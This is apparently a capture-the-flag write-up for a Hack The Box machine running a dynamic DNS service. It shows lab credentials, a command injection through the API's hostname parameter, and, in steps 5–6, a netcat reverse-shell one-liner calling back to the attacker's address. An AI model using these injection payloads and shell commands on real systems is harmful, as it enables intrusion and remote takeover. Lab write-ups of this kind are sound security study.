## Info 
### Credential
 User  | Password | Service | Note
-------|----------|---------|------
dynadns|sndanyd   |         |
dns    |          |         |

### System
- domain: `dnsalias.htb`, `dynamicdns.htb`, `no-ip.htb`, `dyna.htb`
- DNS: `dns1.dyna.htb`, `hostmaster.dyna.htb`

### HTTP
> We are providing dynamic DNS for anyone with the same API as no-ip.com has.


## Path
### User
1. According to the webpage, it has the same API as no-ip.com, so we can use the same API to register a dynamic DNS.
```
GET /nic/update?hostname=ice1187.no-ip.htb&myip=10.10.16.22 HTTP/1.1
Host: no-ip.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Authorization: Basic ZHluYWRuczpzbmRhbnlk
$ nslookup
> server 10.10.10.244
Default server: 10.10.10.244
Address: 10.10.10.244#53
> ice1187.no-ip.htb
Server:         10.10.10.244
Address:        10.10.10.244#53

Name:   ice1187.no-ip.htb
Address: 10.10.16.22
```
2. From `dig`, I found the domain name of the DNS server.
```
$ dig TXT ice1187.no-ip.htb @$ip
; <<>> DiG 9.16.1-Ubuntu <<>> TXT ice1187.no-ip.htb @10.10.10.244

no-ip.htb.              60      IN      SOA     dns1.dyna.htb. hostmaster.dyna.htb. 2021030304 21600 3600 604800 60
```
3. When registering to `dyna.htb`, it shows an error.
```
Request: 
GET /nic/update?hostname=ice1187.dyna.htb&myip=10.10.16.22 HTTP/1.1

Response:
911 [wrngdom: dyna.htb]
```
4. Fuzzing the parameter of the API shows it execute `nsupdate` to update the DNS information, so possible command injection here.
```
$ ffuf -u "http://$ip/nic/update?hostname=FUZZa.no-ip.htb" -H "Authorization: Basic ZHluYWRuczpzbmRhbnlk" -w /opt/SecLists/Fuzzing/special-chars.txt
#                       [Status: 200, Size: 16, Words: 3, Lines: 2]
&                       [Status: 200, Size: 16, Words: 3, Lines: 2]
:                       [Status: 200, Size: 22, Words: 3, Lines: 2]
;                       [Status: 200, Size: 22, Words: 3, Lines: 2]
"                       [Status: 200, Size: 75, Words: 6, Lines: 5]   <- Size is much larger
```
```
Burp: 
Request:
	GET /nic/update?hostname="a.no-ip.htb

Response:
	server 127.0.0.1
	zone no-ip.htb
	update delete a.no-ip.htb
	good 10.10.16.22

Request:
	GET /nic/update?hostname=;a.no-ip.htb

Response:
	911 [nsupdate failed]
```
5. Use command injection to get reverse shell.
```
Request:
	GET /nic/update?hostname=";id;a.no-ip.htb
Response:
	server 127.0.0.1
	zone no-ip.htb
	update delete 
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	good 10.10.16.22
```
6. Use `rev.py` to get shell.
```
$ python3 rev.py
cmd: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.22 13337 >/tmp/f
```
7. In `/home/bindmgr` found `suport-case-XXXXXX` directory. There is an openssh private key in the `XXXXX-debuggin.script`, but not useful at this time.
8. Found the hostname is `dynstr.dyna.htb`.
